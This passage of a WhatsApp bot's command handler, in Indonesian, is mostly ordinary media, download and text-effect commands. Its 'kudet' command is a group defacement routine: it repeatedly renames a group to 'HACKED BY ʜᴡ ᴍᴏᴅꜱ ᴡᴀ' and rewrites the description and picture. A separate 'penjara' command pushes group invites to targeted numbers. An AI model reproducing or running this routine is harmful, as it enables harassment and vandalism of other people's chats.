if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(from, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================/
 case 'kudet': {
 if (!isCreator) return m.reply(mess.owner)
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin        
              if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg'
}
                await haikal.updateProfilePicture(from, { url: pporg }).catch((err) => fs.unlinkSync(pporg))
                }
                await haikal.groupUpdateSubject(from, `HACKED BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`).then((res) => reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `TERKUDUDETOT`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `HAYOLOH PANIK`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `SANTUY`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `1`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `2`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `3`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `4`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `5`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))     
await haikal.groupUpdateSubject(from, `HACKED BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`).then((res) => reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `TERKUDUDETOT`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `HAYOLOH PANIK`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `SANTUY`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `1`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `2`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `3`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `4`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `5`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))     
await haikal.groupUpdateSubject(from, `HACKED BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`).then((res) => reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `TERKUDUDETOT`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `HAYOLOH PANIK`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `SANTUY`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `1`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `2`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
 await haikal.groupUpdateSubject(from, `3`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `4`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))
await haikal.groupUpdateSubject(from, `5`).then((res) =>reploy("𝙎𝙪𝙠𝙨𝙚𝙨 ✅")).catch((err) => m.reply(jsonformat(err)))     
                }
                break
//=================================================//
case 'tomp4': case 'tovideo': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (!isCreator) return m.reply(mess.owner)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (!isCreator) return m.reply(mess.owner)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
m.reply('Sabar Cuy Loading')
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (!isCreator) return m.reply(mess.owner)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
if (!isCreator) return m.reply(mess.owner)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
if (!isCreator) return m.reply(mess.owner)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
haikal.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
if (!isCreator) return m.reply(mess.owner)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(from, ko, { quoted:m })
}
break
case 'getname': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(from, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Contoh* :\n#penjara ʜᴡ ᴍᴏᴅꜱ ᴡᴀ [ Lu Sambil Replay Si nmr Target `)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let anubu = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
}
haikal.sendMessage(from, {image: { url: anu.thumbnail },caption: anu}, { quoted: m })
}
break
case "ytmp4":{
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply('Sabar Cuy Loading')
downloadMp4(text)
}
break
case "ytmp3":{
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply('Sabar Cuy Loading')
downloadMp3(text)
}
break
//=================================================//
case 'mediafire': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*ʜᴡ ᴍᴏᴅꜱ ᴡᴀ*`
m.reply(`${result4}`)
haikal.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'warning': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Harap segera melakukan topup saldo untuk renew/perpanjang server di panel amgeekz.site, 1-3 hari apabila server tidak di perpanjang akan langsung di hapus oleh admin` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break



case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
   if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
m.reply('Sabar Cuy Loading')
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'drapwater': case 'water':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
//=================================================//
case 'q': case 'quoted': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(from, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isCreator) return m.reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
 case 'listonline': {
 if (!isCreator) return m.reply(mess.owner)
let id = args && /\d+\-\d+@s.whatsapp.net/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(from, '⬣ *LIST ONLINE* ✅\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'sendlinkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await haikal.groupInviteCode(from)
haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await haikal.groupInviteCode(from)
haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
haikal.groupRevokeInvite(from)
break
//=================================================//
case 'tagall': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
global.db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
}
}
break
//=================================================//
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
